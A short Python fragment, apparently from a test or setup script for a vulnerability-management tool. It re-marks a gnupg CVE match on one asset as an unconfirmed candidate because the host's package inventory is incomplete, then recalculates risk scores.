    # run_matching 已为该组合创建 not_applicable 行（包未列出）——改为
    # 「未确认候选」语义：装机版本未知、不得据此判不受影响。
    y4_match = db.query(models.VulnerabilityMatch).filter_by(
        asset_id=y4.id, cve_id="CVE-2026-81013:jammy", package_name="gnupg").one()
    y4_match.installed_version = ""
    y4_match.fixed_version = "2.2.27-3ubuntu1.4"
    y4_match.affected = True
    y4_match.match_status = "unknown"
    y4_match.reason_code = "inventory_incomplete"
    y4_match.match_reason = "扫描器自服务横幅识别的候选；主机包清单不完整，装机版本未确认"
    y4_match.confidence = 0.0
    y4_match.active = True
    db.flush()

    calculate_risk(db)
    db.commit()
